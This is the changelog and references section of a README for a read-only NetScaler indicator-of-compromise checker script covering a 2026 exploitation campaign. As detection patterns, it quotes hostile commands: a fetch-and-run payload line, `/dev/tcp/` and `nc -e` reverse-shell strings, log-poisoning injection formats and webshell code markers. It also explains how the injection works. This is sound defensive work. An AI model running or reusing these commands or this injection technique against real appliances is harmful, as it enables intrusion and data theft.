  - **README:** a section on running the checker on many appliances with Julian Jakob's Console job templates and Ferroque Systems' bulk runner.

- **v1.11** (2026-10-03): **SAML status on every run, plus indicators from Gotham Technology Group, Unit 42 and Rapid7.**
  - **Commands run again on fixed builds (2 October, late).** A patched honeypot ran a downloaded malware binary (Kevin Beaumont), and Citrix confirms a new zero-day. Injection lines dated 2 October or later are now `[SUSPECT]` with "may have run" (`targeted=yes,N_since_2oct_may_have_run` and verdict `TARGETED_SINCE_2OCT` in the `--summary` line); before 2 October the after-fix wording stays. The files that injected commands tried to write are taken from the injection lines (`hostname>/path`, `fetch -qo /v`, `${IFS}` decoded) and reported as **compromise** if they exist. The crash check also matches the full reboot sequence: `nsaaad unexpectedly died due to receiving signal`, `proc nsaaad … SIGNALED/EXITED`, `maximum number of restarts`, `Pitboss declaring system failure`. New domain `pyrlnk.cc` (14 in total).
  - **SAML mitigation recognised by what it does (3 October).** Citrix released a new responder policy on 3 October; ask Citrix Support for it. The checker counts any responder policy whose rule mentions `samlauth` or `doAuthentication` and is bound to a Gateway/AAA vserver or globally (Citrix's first and new policies, `RSP_POL_DROP`, community `pol_samlauth_block_v2`, Gotham `rsp_gbl_ioc_drop`), shows only the policy names, never the rule, and reminds you to use Citrix's new policy. New `[CHECK]` when such a policy is bound but the **Responder feature is not enabled** (the policy is then silently ignored; Gotham field case).
  - **The new SAML issue, following Citrix's guidance (2 October).** Citrix confirmed the `nsaaad` crashes are a [new issue, separate from CTX697096](https://community.citrix.com/techzone-blogs/110_security-updates/security-update-guidance-for-netscaler-saml-authentication-deployments/), affecting appliances with `add authentication samlAction` **or** `add authentication samlIdPProfile`. The checker now counts both and always prints the SAML status, also without crashes: `[OK] No nsaaad crashes found (samlAction=0 samlIdPProfile=0 - the SAML issue Citrix announced on 2 Oct does not apply)`, or `[CHECK] SAML configured (samlAction=1 samlIdPProfile=0) - affected by the new SAML issue; … interim workaround bound / NOT bound`, with a link to Citrix's guidance and a note that the interim workaround only covers the SP endpoint when an IdP profile exists. Appliances with SAML now get verdict `FOLLOW_UP`; once Citrix publishes the bulletin, a later version will recognise the fixed builds. The `--summary` line has a new field `saml=sp|idp|sp+idp|none`.
  - **Better crash detection.** NetScaler also logs `nsaaad` crashes as `proc nsaaad … EXITED` and `monitored processes have exited` in `/var/log/messages` (pattern from Gotham Technology Group's advisory), plus `proc nsaaad … SIGNALED` and `maximum number of restarts` (community detection). The stricter community policy `pol_samlauth_block_v2` is recognised as a workaround too.
  - **37 more attacker IPs (95 in total):** Unit 42's 1 October update (pre-disclosure `.deb` requests and exploitation), Rapid7, two addresses shared in the NetScaler community, and Gotham Technology Group's incident-response list (shared with permission). 32 lower-confidence probe senders were added to the scanner group. Cloudflare and carrier-NAT addresses are left out.
  - **5 more domains (14 in total):** `pylrk.cc` and `pyrlnk.cc` (download servers seen on 2 October; `pyrlnk.cc` removed again in v1.12, it was a misspelling), `oast.fun`, `dnsl.cc` and `gs.thc.org`.
  - **New file checks (compromise):** `x.sh`, the stolen-config archive `vpn/c`, `/var/netscaler/.ns_suidcmd`, and NOTROBIN leftovers from 2020.
  - **New log checks:** `/vpn/c` requests (HTTP 200 = compromise), `/nsconmsg` requests, the `K:<base64>#` User-Agent, `x.sh` / `Team-NetScaler-Inventory`, and password-spray sources. All in one shared pass over the logs: 38 s instead of 34 s on 255 MB of test logs.

- **v1.10** (2026-10-02): **fixes the `--ioc` hang and is much faster**, plus indicators from LevelBlue and TENEX.
  - **Hang fix:** the SLAPSHOT check added in v1.9 searched `/tmp` with `grep -r`. NetScaler keeps named pipes there (`.nscli_pipe`, `pitboss.debug` and others), and FreeBSD's `grep` reads them and waits forever, so `--ioc` stopped after the `ns.log` checks on any appliance. Only regular files (under 20 MB) in `/tmp` and `/var/tmp` are read now, and no recursive `grep` is left. Tested with a FreeBSD-style `grep`.
  - **Speed fix:** v1.9 searched all logs once per attacker IP (42 full passes, unpacking every rotated `.gz` each time), which could run for many minutes at 100% management CPU on large MPX/VPX logs and looked like a hang. All known IPs and domains are now found in **one** pass and split afterwards; the scanner-IP, `pitboss` and login-page checks use a fast fixed-string search first. Results are identical. On 255 MB of test logs: v1.8 66 s, v1.9 153 s, v1.10 31 s. The web-file and hash checks now run in one process instead of one per file (on FreeBSD each new process is slow): on a test setup with 3,000 web files, 5 s instead of 20 s. The non-Receiver VPN summary uses `perl` instead of a `sed` pattern that took 7.8 s for 4,300 log lines on a production VPX. The output now shows an estimate before the sweep, progress while it runs, and the real run time at the end.
  - **False-positive fix:** the Arctic Wolf `nsmon` checks matched any process, cron or log line containing `nsmon`, including NetScaler's own `nsmonitor` and custom Perl monitor scripts. They now only match the implant itself (`nsmon.pl`, `/var/tmp/.nsmon/`).
  - **LevelBlue** ([via The Hacker News](https://thehackernews.com/2026/10/citrix-netscaler-post-exploitation.html)). Compromise (red): the backdoor superuser account `sec_monitor` in `ns.conf`, a webshell hidden as `LogonPoint/.local_journal` (before, only a yellow hidden-file warning), and the `/tmp/update_result_*.tgz` config staging archive. Targeted: `kill` of `customsnmpd` in the shell history. New `[CHECK]`: every account with superuser rights in `ns.conf` other than `nsroot`. LevelBlue's C2 IPs and payloads were already covered by v1.9.
  - **[TENEX](https://tenex.ai/blog/what-tenex-observed-inside-active-exploitation-of-netscaler-zero-day/) (30 September):** the Platypus C2 agent (`/var/core/.ns-cache` with `client.crt`/`client.key`, `/netscaler.local/ns_*.pl`, a replaced `customsnmpd` found by hash or signing key, decoy process names), the `LogonUISimple.html.style.min` webshell alias, `id009.txt`, gsocket and netcat processes, 6 more IPs (48 in total), 7 domains, and `gsocket` / `platypus-agent` / `/api/v1/agents/enroll` / `;# NSX` in the logs. New `[CHECK]`: `customsnmpd` larger than 10 MB.
  - **New `--summary` option** for NetScaler Console configuration jobs and runs across many appliances: one result line per appliance (`host`, `build`, `status`, `isn`, `compromise`, `targeted`, `verdict`), the red findings, a count of `[CHECK]` items and the verdict on screen; the full report is saved on the appliance. See "From NetScaler Console" above.
  - **Deyda triage script v9.43:** checks from Manuel Winkel's [Deyda triage script v9.43](https://github.com/Deyda/Security/blob/main/deyda-netscaler-ioc-check.sh). Compromise (red): an admin-persistence payload script (adds and binds a user, EPA default group `NO_AUTH`, unbinds authentication/VPN policies, saves the config; all five together). `[CHECK]`: copies of `ns.conf` / `.F1.key` / `.F2.key` in web or temp folders and the config exports `c1.txt`, `c2.txt`, `labels.txt`. Targeted: the webshell command cookie `NSC_TASS` in the HTTP logs.
  - **New `--days N` option** (default 30): how far back the "files changed recently" checks look, for both the web folders and `/`, `/var`, `/tmp` and `/var/tmp`. Before it was fixed at 14 and 3 days; 30 days covers the whole campaign so far, and `--days 60` looks further back.
  - On a compromise, the output now also says: snapshot a VPX and collect `show techsupport` first, and rotate the KEK and revoke the certificates (CTX694799).
  - **Local system users and the Wiz admin-persistence payload** (Amitai Cohen, [Wiz](https://x.com/AmitaiCo); thanks to Rupender Bauhtey for the question). The payload adds an admin user, sets the EPA default group to `NO_AUTH` and unbinds EPA policies, with no webshell, file or process left behind. Compromise (red): EPA default group `NO_AUTH` in `ns.conf` (or an older saved copy) or in a `CMD_EXECUTED` line in `ns.log`. `[CHECK]`: every system user besides `nsroot` with its policies and groups (before, only superuser accounts), users added since an older saved config (with the date), EPA policies unbound since the oldest saved config, and user / EPA / policy commands in the CLI audit log.
  - **Generic post-exploitation checks** (prompted by [Florian Roth, Nextron](https://x.com/cyb3rops/status/2105944144375927132): THOR's generic rules flagged these artefacts before the CVEs were public). Compromise (red): the Platypus agent bootstrap script by content (its hash differs per victim), and generic obfuscated webshell code in all web-served folders (`eval` of `gzinflate`/`base64_decode`/`str_rot13`…, `eval`/`assert` on request input, `preg_replace /e`, `create_function`). Targeted: `/api/v1/install/` and `plt_` tokens in the logs and shell history. `[CHECK]`: scripts in temp folders that download and run something. A simple one-line webshell that runs whatever is posted to it outside `LogonPoint/custom` and `/var/vpn` was only a `[CHECK]` before; now it's red.
  - **Sygnia and LevelBlue SpiderLabs** ([Sygnia](https://www.sygnia.co/threat-reports-and-advisories/actively-exploited-netscaler-vulnerabilities/), [LevelBlue](https://www.levelblue.com/blogs/spiderlabs-blog/citrix-netscaler-cve-2026-88771-observed-exploitation-artifacts-and-hunt-indicators), both 30 September): 8 more attacker IPs, and 87.224.84.82 moved from the scanner group to the attacker IPs (57 in total), the `main.py` payload hash, and `/var/log/notice.log` is now searched for attacker IPs, domains and `pitboss` injection lines too.
  - **The SAML-attack kit (2 October).** From a sample shared by the community (SHA-256 `72cff13fcba75504485e94fa6bfc5e9363e860f49efdba68feb583148eec38f2`). The SAML attack tries to install a full kit: webshells (`.slap.receiver`, `.ctxs.receiver`, `receiver.deb`), PHP switched on in `httpd.conf`, setuid `/bin/sh`, a Perl tunnel agent in `/nsconfig/.slap/` that survives reboots, Python tunnels in `/var/tmp/.ux/` (`slapshot.py`, `whipd.py`), persistence in `rc.netscaler` and the root crontab, and upload of all of `/nsconfig` to 213.209.159.55. All of these are now reported as compromise, also when they are running. The alias check now also matches `receiver.v2.min…css`, the dropper hash is added (20 hashes), and the IP too (58 IPs). The setuid check on `/bin/sh` now follows a symlink.
  - **Authentication daemon crashes on fixed builds (2 October).** New `[CHECK]`: `nsaaad` core files and crash lines. Repeated `nsaaad` crashes make the appliance restart, one HA node after the other. With SAML SP configured, the output points to the Citrix Support workaround and says whether its policy (`pol_samlauth_prefixlist_block`) is bound. Open a Citrix case and keep the core files.
  - **`nsvpn.log` is now searched.** The authentication daemon `nsaaad` logs login names in `/var/log/nsvpn.log` (`call to authenticate user :pitboss PPE unexpectedly died NSPPE;…`), and those lines don't always appear in `ns.log` too. It's now part of all injection checks, the IP and domain pass and the estimate. A bot seen on 2 October sends `fetch -qo /v http://<host>:443/t/<hex>; sh /v` with `${IFS}` instead of spaces. Its log lines are reported as targeted, and a file `/v` is reported as compromise. On a fixed build the command doesn't run, but the crafted logins have crashed fixed appliances and caused reboots. If that happens, block external access and open a Citrix case with the core files. Thanks to the community members who shared their logs!
  - **Root-cause analysis by [craigsblackie](https://github.com/craigsblackie/cve-2026-88771-netscaler):** the vulnerable daily script runs any log line matching `pitboss.*PPE.*unexpectedly died` or `missed too many heartbeats`, so the command can also come **before** those words (`pitboss NSPPE-00;<cmd>;# unexpectedly died`). The **ARMED** check (red, vulnerable builds) missed that order; it now uses the script's own pattern plus a shell character. New `[CHECK]`: failed management/NITRO logins from public addresses in `ns.log`, because the attack is staged through a failed login to the unauthenticated NITRO API (`POST /nitro/v1/config/login`).
  - **You can see what it's doing.** Before the IoC sweep, the output says the checker is read-only (nothing on the appliance is changed, nothing is sent anywhere), how many log files and MB it will search, and the expected run time. While it runs, progress lines `[1/6]` … `[6/6]` are shown on screen with the elapsed time, so you can see which step is slow (screen only: not in the report, and not in a Console job). At the end: `Done in 19s (expected 10s-20s). Checked 58 attacker IPs, 9 domains, 20 hashes and all public indicators up to 3 Oct 2026`, so a saved report shows how current the check was. The run time is also in the `--summary` line as `runtime=`. Thanks to Manuel Winkel (Deyda) for the idea of an estimate.
- **v1.9** (2026-10-01): all public indicators published since v1.8, in one release.
  - **PitScaler.com:** indicators from the [PitScaler.com](https://pitscaler.com) IoC collection. 15 more attacker IPs (C2, payload hosts, exfiltration, reverse shell; Truesec, eSentire, IFIN, Corelight, Lupovis) and the domain `echvista.com`, 32 in total; about 60 opportunistic scanner IPs from GreyNoise in a separate hunting-lead group (Cloudflare WARP left out); 3 more webshell hashes, also checked in the Gateway plugin and media folders; WHIPSHOT header code and the SLAPSHOT `UXD_IDLE_EXIT` marker (Mandiant); base64 PHP (`PD9…`) in the User-Agent, shown decoded (eSentire); `php_flag engine on` / `SetHandler` PHP in `httpd.conf` (Beazley).
  - **Beazley Security:** two persistence and anti-forensics checks from Beazley Security's advisory (BSL-A1216): cron jobs in `/var/cron/tabs` that delete or empty logs or files (red), crontabs for users other than root (`[CHECK]`), and suspicious commands in `/nsconfig/nsafter.sh` (red) or recent changes to it (`[CHECK]`).
  - **watchTowr:** marker files from exploit tools are now also looked for in `/tmp` (`watchTowr*`, `wtw*`, `boom*`). The public watchTowr detection tool for CVE-2026-88772 (DTLS) writes a 7-byte marker to `/tmp/watchTowr`, which earlier versions did not check. `/tmp` is emptied at reboot, so after a reboot the packet-engine crash/restart checks are the main trace of CVE-2026-88772.
  - **Arctic Wolf and Elastic:** indicators from [Arctic Wolf's alert pack](https://github.com/rtkwlf/wolf-tools/tree/main/pack_alerts/202609-citrix-netscaler-active-exploitation-cve-2026-88771) (30 September). Compromise: the `nsmon.pl` Perl implant (`/var/tmp/.nsmon` with `.cfg`, `.state`, `nsmon.pl`), its cron persistence in any crontab, a running `nsmon` process or a Perl listener on port 41000–41999, `/var/tmp/.s`, and 5 payload SHA-256 hashes (also checked in `/tmp`, `/var/tmp`, `/` and `/var`). Targeted: 5 more attacker IPs (37 in total), the domain `entretiensol.com`, and payload strings `xd7h/`, `nsmon`, `update_c08937`, `/dev/tcp/`, `nc -e`, `base64 -w0`, `exec-ok`, now also searched in `/var/log/messages`. Following [Elastic](https://github.com/elastic/detection-rules/blob/main/rules/network/initial_access_netscaler_log_poisoning_command_injection.toml)'s log-poisoning rule, any `pitboss` packet-engine message with a shell character (`;`, backtick, `$(`, `&&`, `||`, also URL-encoded) is now reported as an injection attempt, which catches hand-written variants without a known command name.
  - **Deyda triage script v9.28:** 3 more webshell/payload hashes (Unit 42), attack payloads in login-page requests in the HTTP logs, webshell header names in the HTTP logs, `.pl`/`.rpm`/`.tgz` in the `httperror` check, a combined warning when DTLS failures and packet-engine crashes both appear, and a `[CHECK]` for PHP/XHTML files in unexpected places under `/var/netscaler`.
  - **[Unit 42](https://unit42.paloaltonetworks.com/netscaler-zero-days-exploited/) (30 September):** 5 more attacker IPs (42 in total; its two Cloudflare WARP addresses are left out), the `.deb` webshell's RC4 key, token and passphrase found by content (red), the token in the HTTP logs, and the `NSPPE-00;` variant of the log-poisoning line, which the ARMED check on vulnerable builds missed.
  - **Fix:** a matched log line could show as empty (reported on 64.94.85.67). All log searches now read logs as text even when they contain binary bytes, and non-printable bytes, including terminal escape codes, are shown as `.` with the label "(line contains binary data)". Counts and the red/yellow decision are unchanged.
- **v1.8** (2026-09-30): the fix date for the `[BEFORE fix]` / `[after fix]` tags is now taken from the running build's kernel in `/flash` (`ns-<build>.gz`, written once by `installns`) and the first boot after the install (`installns_state_post_reboot`), capped by the last boot. Up to v1.7 it was the newest entry of any kind in `/var/nsinstall`, and `adc.version` in that folder is rewritten when someone logs on to the GUI, so attacks after the patch could be tagged `[BEFORE fix]` (a false red). The output now says where the date comes from, and there is an optional `--fixdate` override. Staged firmware (installed, not yet booted) is also detected from `/flash`. Thanks to the World of EUC Slack community for reporting this.
- **v1.7** (2026-09-30): indicators from Gotham Technology Group's IoC check (shared with permission) and Manuel Winkel's (Deyda Consulting) triage script v9.17, with review and feedback from Michael Shuster (Ferroque Systems).
  - **Compromise:** files dropped by known payloads (`/.x`, `/s`, `lula`, `/var/1.py`, `update_c*.pl`, `themes/wt88771*`); payload-targeted files (`insight-new.js`, `admin_ui/e.txt`, `admin_ui/log.txt`, contents not shown); setuid `/var/tmp/sh`; persistence strings in startup files; text/script files in client-package folders; payload processes and open connections to campaign infrastructure; **ARMED** payload text waiting on a vulnerable build.
  - **Targeted:** nine more attacker IPs (17 in total, also searched in `messages`); `nsepa.deb` 1-byte probes, `vp_probe_nonexist`, `scanner-probe` logins and `.ctxs.receiver` probing per source IP; key and config theft in the shell history. Apache error-log dates are now tagged before/after the fix too.
  - **Context:** hidden files in all web folders, `.dot` files, files changed in the last 3 days in `/`, `/var`, `/tmp` and `/var/tmp`, download/one-liner processes, public connections, packet engines restarted after boot, root crontab downloads, `HeadlessChrome`.
  - Admin CLI commands logged in `ns.log` (`shell_command=`) are no longer counted as attacks. `--out` reports are defanged. A compromise now says: don't reboot yet, copy the evidence first.
  - **Fewer false alarms (tested on a production HA pair):** the NetScaler Console Security Advisory scan files in `/var/tmp` (`*-detection.py`, and its `log.txt` / `results.txt` when written within 5 minutes of them), NetScaler's own `ns_system_backup.pl`, `install_pre_check.json`, `.monit.id` and `_callhome_tmp_file`, and root crontab calls to `localhost` are recognised as normal.
  - **Fix: attempts before the patch could be hidden.** The yellow/red decision for exploitation traffic used only the first few lines of each indicator, so an attempt before the fix in an older, rotated log could be missed and the result shown as yellow. It now decides on **all** lines, shows `[BEFORE fix]` lines first in every group, and says how many came before the fix. Found on a production appliance that was targeted 1.5 hours before it was patched.
  - **Compromise:** `c88771.json` and `xua.html` (payload files seen in the wild on 29 Sep: an `expr` test and a `tar` of `/flash/nsconfig` disguised as a web page), and **any archive disguised as a web file** (`.html`, `.json`, `.css`, `.js`, `.txt` with gzip, tar or zip content), whatever it is called.
  - **Verdict:** a vulnerable box now reads "the fixed build covers all eight CVEs in CTX697096". A fixed box with Enhanced ISN still off (in the default partition or any admin partition) now says "CVE-2026-88778 is still open" instead of only "follow-up items above".
- **v1.6** (2026-09-29): attempts after the patch are no longer shown as red, plus fixes found during a live HA upgrade.
  - `ns.log` injection attempts that are all `[after fix]` now give a yellow `[CHECK]` instead of a red `[SUSPECT]`. Known attacker IPs are shown as dated log lines tagged `[BEFORE fix]` / `[after fix]` (before, only the file names), and base64 User-Agent payloads and Gateway staging errors are tagged too. Compromise indicators stay red whatever the date.
  - On the appliance, the build is now read from the **running** kernel instead of the `ns.conf` header. Before, the checker reported the old (vulnerable) build after an upgrade until `save ns config` was run. If the two differ, it now warns that the config has not been saved since the upgrade.
  - `--ioc`: when the newest `/var/nsinstall` entry is newer than the last boot, the new build is reported as staged but **not running yet** (reboot pending), and the exposure is shown as running since at least the last boot. Before, the copy date of the staged build was wrongly shown as the start of the exposure window.
- **v1.5** (2026-09-29): new public indicators from Mandiant/GTIG and Kevin Beaumont, including CVE-2026-88772.
  - **Compromise:** `httpd.conf` handlers that run non-`.php` extensions as PHP and `AliasMatch` rules into Gateway folders; webshell code in the Gateway plugin and media folders; tunnel artefacts in `/tmp` and Python processes started from base64; PHP or shell scripts under `/netscaler/ns_gui` written after boot (webshells differ per appliance).
  - **Targeted / post-exploitation:** CVE-2026-88772 (DTLS) handshake failures and packet-engine crashes; `ldapsearch` / `openssl s_client` / `ns_gui/vpn` in the shell history (LDAP credential theft); a User-Agent that is only base64 (shown decoded); `pitboss` with `b64decode`; `.sh` and `.php` in the httperror logs; two more attacker IPs (eight in total).
  - Headings now say CVE-2026-88771/88772.
- **v1.4** (2026-09-29): catches CVE-2026-88771 as exploited in the wild, based on public reporting by GreyNoise, Marius Sandbu, Lupovis, watchTowr and CERT-EU. Results are split into "compromised" (a command ran: the `.ctxs.receiver` webshell by name, SHA-256 or content, PHP where no PHP belongs, the `receiver.min.css` httpd alias, files written by exploit payloads including any file containing `id` output, setuid `/bin/sh`) and "targeted" (six known attacker IPs, exploit strings and scanner user agents, base64 `INDEX:` payloads in the User-Agent shown decoded). Exploitation log lines are tagged `[BEFORE fix]` / `[after fix]` relative to the fixed-build install; when all attempts came after the fix, the result is `[CHECK]` instead of `[SUSPECT]` (tested on a production appliance attacked hours after patching). Files written between the firmware install and the next boot count as part of the upgrade, which also covers files that HA file sync copies from the peer while it is being upgraded (tested on a production HA pair). PHP notices from the management GUI and the `/vpns/j_services.html` portal page are no longer flagged. The `ns.log` injection check now also searches `/var/log/messages` and catches the fake `pitboss` markers (`unexpectedly died NSPPE;` and `missed too many heartbeatsNSPPE;`), `${IFS}` instead of spaces, URL-encoded payloads and commands without a following space (`;id>`); v1.3 missed several of these.
- **v1.3** (2026-09-28): `--ioc` gives context and far fewer false positives; tested on a production appliance.
  - **Context:** firmware install date (start or end of the exposure window), last boot (are in-memory traces still there?), log retention for `ns.log`, `notice.log` and `httpaccess-vpn.log` (warning below 7 days).
  - **Web files:** changes in the last 14 days are clustered into bursts (20+ files within 30 s = theme/system rewrite). Files changed on their own get a timestamp, how many similar files in the folder changed with them, and a content check. Files written during the upgrade/reboot and the standard Citrix `strings.<lang>.js` loader template are recognised. Code that sends data or loads scripts, obfuscated loaders and PHP webshell calls are marked with the new red `[SUSPECT]` label.
  - **Fewer false positives:** `httpd.conf` changed at boot, FreeBSD `bounds`/`minfree` in `/var/core`, and more standard Gateway paths (including `OPTIONS *`) are treated as expected.
  - **Output:** new labels `[fixed]`, `[OK]` and `[SUSPECT]`; new `--out <file>` and `--version` options; lists show "... and N more" instead of being cut silently.
  - **Portability:** timestamps via perl (NetScaler may not ship `stat`); correct FreeBSD `kern.boottime` parsing.
- **v1.2** (2026-09-28): on fixed builds, met preconditions are shown as `[met/fixed]` instead of red `[AFFECTED]`; `--ioc` VPN check now summarises paths and source IPs (with NAT warning) instead of listing every request; new `--ioc` check for shell metacharacters in logon-related `ns.log` entries (CVE-2026-88771 technique, per watchTowr's public analysis).
- **v1.1** (2026-09-28): `--ioc` adds last firmware install / exposure window, `nobody` cron and processes, `.php` in httperror logs, and non-Receiver VPN access (adapted from the deyda.net checklist).
- **v1.0** (2026-09-28): initial release covering the build, all 8 CTX697096 preconditions, admin partitions, Enhanced ISN, and the 13.1-64.24 / SAML upgrade risks.

---

## Troubleshooting

**`: not found` or `Syntax error: word unexpected` on the NetScaler.** The file has Windows (CRLF) line endings, usually from a text-mode transfer or from saving the file on Windows. Fix it on the appliance:

```sh
tr -d '\r' < ctx697096_check.sh > ctx697096_fixed.sh && sh ctx697096_fixed.sh
```

To prevent it, upload in **binary** mode in WinSCP, or clone and download from GitHub, where `.gitattributes` enforces LF line endings.

---

## References

**Citrix / NetScaler (official)**
- [CTX697096 – Citrix security bulletin](https://support.citrix.com/external/article/CTX697096/citrix-netscaler-adc-and-citrix-netscale.html)
- [CTX697174 – Citrix security bulletin for CVE-2026-88779](https://support.citrix.com/external/article/CTX697174) and the [CVE record](https://www.cve.org/CVERecord?id=CVE-2026-88779)
- [Citrix Tech Zone – Understanding and Addressing CVE-2026-88779](https://community.citrix.com/techzone-blogs/110_security-updates/understanding-and-addressing-cve-2026-88779-in-citrix-netscaler-adc-and-citrix-netscaler-gateway/) (Global Deny List mitigation)
- [Citrix Tech Zone – Guidance for CVE-2026-88771 through CVE-2026-88778](https://community.citrix.com/techzone-blogs/110_security-updates/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve-2026-88771-through-cve-2026-88778/)
- [Citrix Tech Zone – Understanding NetScaler Indicators of Compromise](https://community.citrix.com/techzone-blogs/110_security-updates/understanding-netscaler-indicators-of-compromise-what-the-ioc-feature-does-how-it-evolves-and-how-to-interpret-results/)
- [CTX694799 – Steps to take if NetScaler ADC is suspected to be compromised](https://support.citrix.com/external/article/CTX694799/steps-to-take-if-netscaler-adc-is-suspec.html)
- [NetScaler docs – Enhanced ISN generation](https://docs.netscaler.com/en-us/citrix-adc/current-release/system/tcp-configurations.html#enhanced-isn-generation)
- [NetScaler docs – Configurations support in admin partition](https://docs.netscaler.com/en-us/citrix-adc/current-release/admin-partition/admin-partition-config-types.html)
- [CISA – Known Exploited Vulnerabilities catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) (CVE-2026-88779 added 4 October 2026)
- [BleepingComputer – Citrix patches NetScaler SAML zero-day exploited in attacks](https://www.bleepingcomputer.com/news/security/citrix-patches-netscaler-saml-zero-day-exploited-in-attacks/)
- [CISA – Critical Zero-Day Vulnerabilities Exploited in Citrix NetScaler ADC, Gateway](https://www.cisa.gov/news-events/alerts/2026/09/27/critical-zero-day-vulnerabilities-exploited-citrix-netscaler-adc-gateway) and the [Known Exploited Vulnerabilities catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)

**Threat intelligence and indicators used by the IoC sweep**
- [Mandiant / Google GTIG – Defending against active exploitation of Citrix NetScaler](https://cloud.google.com/blog/topics/threat-intelligence/defending-against-active-exploitation-of-citrix-netscaler-adc-and-gateway-appliances/)
- [Unit 42 – NetScaler zero-days exploited](https://unit42.paloaltonetworks.com/netscaler-zero-days-exploited/)
- [TENEX – What TENEX observed inside active exploitation of the NetScaler zero-day](https://tenex.ai/blog/what-tenex-observed-inside-active-exploitation-of-netscaler-zero-day/)
- [LevelBlue SpiderLabs – Citrix NetScaler CVE-2026-88771: Observed Exploitation Artifacts and Hunt Indicators](https://www.levelblue.com/blogs/spiderlabs-blog/citrix-netscaler-cve-2026-88771-observed-exploitation-artifacts-and-hunt-indicators)
- [LevelBlue post-exploitation findings, via The Hacker News](https://thehackernews.com/2026/10/citrix-netscaler-post-exploitation.html)
- [Sygnia – Actively Exploited NetScaler Vulnerabilities](https://www.sygnia.co/threat-reports-and-advisories/actively-exploited-netscaler-vulnerabilities/)
- [Arctic Wolf – Citrix NetScaler active exploitation via CVE-2026-88771 (alert pack)](https://github.com/rtkwlf/wolf-tools/tree/main/pack_alerts/202609-citrix-netscaler-active-exploitation-cve-2026-88771)
- [watchTowr – Citrix NetScaler pre-auth command injection (CVE-2026-88771)](https://labs.watchtowr.com/oh-look-the-foot-gun-went-off-again-citrix-netscaler-preauth-command-injection-cve-2026-88771/)
- [watchTowr – detection artefact generator for CVE-2026-88772](https://github.com/watchtowrlabs/watchTowr-vs-Citrix-Netscaler-CVE-2026-88772)
- [CERT-EU – Taking "execute logging" a bit too literally (CVE-2026-88771)](https://cert.europa.eu/blog/taking-execute-logging-a-bit-too-literally-cve-2026-88771)
- [GreyNoise – Swarming against Citrix 0-day exploitation](https://www.greynoise.io/blog/swarming-against-citrix-0-day-exploitation)
- [Beazley Security – BSL-A1216: Citrix NetScaler zero-day advisory](https://labs.beazley.security/advisories/BSL-A1216)
- [PitScaler.com – timeline and IoC collection](https://pitscaler.com) (Truesec, eSentire, IFIN, Corelight, Lupovis and others)
- [Lupovis](https://x.com/LupovisDefence) – honeypot observations
- Gotham Technology Group – IoC check, incident-response indicators and the 2 October crash-attack advisory (shared privately, used with permission)
- Rapid7 – `/vpn/c` config-archive path and attacker IP (via Gotham Technology Group)
- ThreatUnpacked, r/Citrix sample analysis, Valhalla and the CISA Sigma rule – SAML-attack kit hashes and files, `-WR` runs (via Gotham Technology Group, 3 October)

**Detection rules and triage tools**
- [Elastic – Potential NetScaler Log Poisoning Command Injection Attempt (detection rule)](https://github.com/elastic/detection-rules/blob/main/rules/network/initial_access_netscaler_log_poisoning_command_injection.toml)
- [Nextron Systems – THOR / THOR Lite](https://www.nextron-systems.com/thor-lite/): generic YARA rules that flagged the NetScaler webshells and scripts without knowing the CVE. Run it against a copy of the file system (SSHFS or THOR Thunderstorm with file collection), not on the appliance itself. [Florian Roth on X](https://x.com/cyb3rops/status/2105944144375927132)
- [Sn1per – CVE-2026-88771 detection (remote build fingerprint)](https://sn1persecurity.com/wordpress/cve-2026-88771-citrix-netscaler-preauth-rce-detection-with-sn1per/): finds unpatched NetScalers from outside, without logging in, by reading the build date of a static Gateway file. Use it on your own appliances to find ones you've missed; the checker then tells you what happened on each box.
- [Julian Jakob – NetScaler: run and get IoC scripts with Console](https://www.julianjakob.com/netscaler-run-get-ioc-scripts-with-console/)
- [Ferroque Systems – netscaler-ioc-bulk-check (GitHub)](https://github.com/FerroqueSystems/netscaler-ioc-bulk-check)
- [Deyda – NetScaler IoC triage script (GitHub)](https://github.com/Deyda/Security/blob/main/deyda-netscaler-ioc-check.sh)
- [Deyda – NetScaler CVE checklist: updates, security assessment and incident response](https://www.deyda.net/index.php/en/2026/08/28/netscaler-cve-checklist-updates-security-assessment-and-incident-response/)

**Background**
- [craigsblackie – CVE-2026-88771 root-cause analysis (GitHub)](https://github.com/craigsblackie/cve-2026-88771-netscaler): how the failed NITRO login, `ns.log` and the daily `ns_monuploadd_err.pl` check combine, and what the fix changed
- Blog post: [CVE-2026-88771 through CVE-2026-88778, what you should know and how to fix your NetScaler ADC, NetScaler Gateway](https://www.poppelgaard.com/cve-2026-88771-through-cve-2026-88778-what-you-should-know-and-how-to-fix-your-netscaler-adc-netscaler-gateway) (Thomas Poppelgaard), with the full timeline

---

## Contributing

Found a false alarm, a missed indicator or a better way to detect something? Open an issue or a pull request. Please leave out customer names, hostnames, IP addresses, credentials and indicators from an incident that is still open.

---

## ❤️ Support this project

This tool is free and will stay free. If it saved you time, you can say thanks with a voluntary contribution — completely optional:

👉 [Support netscaler-ctx697096-checker](https://donate.stripe.com/9B6aEX4fTasY7F70AbbbG00)

For larger contributions or if you need an invoice, contact me at [thomas@poppelgaard.com](mailto:thomas@poppelgaard.com).

---

## Disclaimer

An independent community tool, **not** affiliated with, endorsed by or supported by Cloud Software Group / Citrix. Provided as is, without warranty. It is read-only, but read it before you run it, and use it only on appliances you own or are authorised to check.

A clean run is not proof that an appliance was never compromised: the checker only knows what has been published so far. The Citrix security bulletin is the authoritative source. Weigh the results together with the official Citrix IoC scan and your firewall and DNS logs. If you suspect a compromise, preserve evidence first and involve experienced incident responders.

Questions or a suspected compromise? Contact [thomas@poppelgaard.com](mailto:thomas@poppelgaard.com).

Author: **Thomas Poppelgaard**, [Poppelgaard.com ApS](https://www.poppelgaard.com)
